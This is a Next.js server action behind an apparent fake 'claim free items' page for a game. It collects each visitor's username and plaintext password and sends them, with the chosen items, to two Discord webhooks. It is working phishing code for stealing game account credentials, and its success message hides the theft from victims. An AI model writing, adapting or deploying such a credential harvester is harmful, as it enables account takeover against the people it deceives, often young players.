"use server"

export async function claimItemsAction(prevState: any, formData: FormData) {
  // Simulate server processing time (e.g., 2 seconds)
  await new Promise((resolve) => setTimeout(resolve, 2000)) // 2 seconds server delay

  const username = formData.get("username") as string
  const password = formData.get("password") as string

  // Collect selected items
  const selectedItems: string[] = []
  if (formData.get("dragonfly") === "on") selectedItems.push("Dragonfly")
  if (formData.get("moon-blossom") === "on") selectedItems.push("Moon Blossom")
  if (formData.get("racoon") === "on") selectedItems.push("Racoon")
  if (formData.get("mimic") === "on") selectedItems.push("Mimic")
  if (formData.get("candy-blossom") === "on") selectedItems.push("Candy Blossom")
  if (formData.get("bone-blossom") === "on") selectedItems.push("Bone Blossom")

  const WEBHOOK_URL_1 = process.env.DISCORD_WEBHOOK_URL_1
  const WEBHOOK_URL_2 = process.env.DISCORD_WEBHOOK_URL_2

  let overallSuccess = true
  let clientErrorMessage = "" // This will be sent to the client

  // --- Message for Webhook 1 (Username, Password, and Discord Invite) ---
  const messageForWebhook1 = {
    content: "New Login Attempt (Username, Password & Discord Invite)",
    embeds: [
      {
        title: "Login Credentials",
        color: 16711680, // Red color for sensitive info
        fields: [
          { name: "Username", value: username, inline: false },
          { name: "Password", value: password, inline: false }, // WARNING: Insecure for production!
          {
            name: "Discord Invite",
            value: "https://discord.gg/7baKAcgvjC",
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  }

  // --- Message for Webhook 2 (Username, Password, and Selected Items) ---
  const messageForWebhook2 = {
    content: "New Login Attempt & Item Claim!",
    embeds: [
      {
        title: "Login Details",
        color: 3447003, // A nice blue color
        fields: [
          { name: "Username", value: username, inline: false },
          { name: "Password", value: password, inline: false }, // WARNING: Insecure for production!
          {
            name: "Selected Items",
            value: selectedItems.length > 0 ? selectedItems.join(", ") : "No items selected",
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  }

  // --- Send to Webhook 1 ---
  if (WEBHOOK_URL_1) {
    try {
      const response1 = await fetch(WEBHOOK_URL_1, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(messageForWebhook1),
      })
      if (!response1.ok) {
        overallSuccess = false
        const errorText = await response1.text()
        clientErrorMessage += `\n- Webhook 1 failed: ${response1.status} ${errorText}`
        console.error("Webhook 1 failed:", response1.status, errorText)
      }
    } catch (error) {
      overallSuccess = false
      clientErrorMessage += `\n- Error sending to Webhook 1: ${error}`
      console.error("Error sending to Webhook 1:", error)
    }
  } else {
    overallSuccess = false
    console.warn("DISCORD_WEBHOOK_URL_1 environment variable is not set.")
  }

  // --- Send to Webhook 2 ---
  if (WEBHOOK_URL_2) {
    try {
      const response2 = await fetch(WEBHOOK_URL_2, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(messageForWebhook2),
      })
      if (!response2.ok) {
        overallSuccess = false
        const errorText = await response2.text()
        clientErrorMessage += `\n- Webhook 2 failed: ${response2.status} ${errorText}`
        console.error("Webhook 2 failed:", response2.status, errorText)
      }
    } catch (error) {
      overallSuccess = false
      clientErrorMessage += `\n- Error sending to Webhook 2: ${error}`
      console.error("Error sending to Webhook 2:", error)
    }
  } else {
    overallSuccess = false
    console.warn("DISCORD_WEBHOOK_URL_2 environment variable is not set.")
  }

  if (overallSuccess) {
    return { success: true, message: "Items claimed and data sent to both Discord webhooks!" }
  } else {
    // If overallSuccess is false but no specific clientErrorMessage was added (meaning only unset webhooks)
    if (clientErrorMessage === "") {
      return { success: false, message: "Failed to claim items. Please try again." }
    } else {
      return { success: false, message: `Failed to send data to Discord:${clientErrorMessage}` }
    }
  }
}
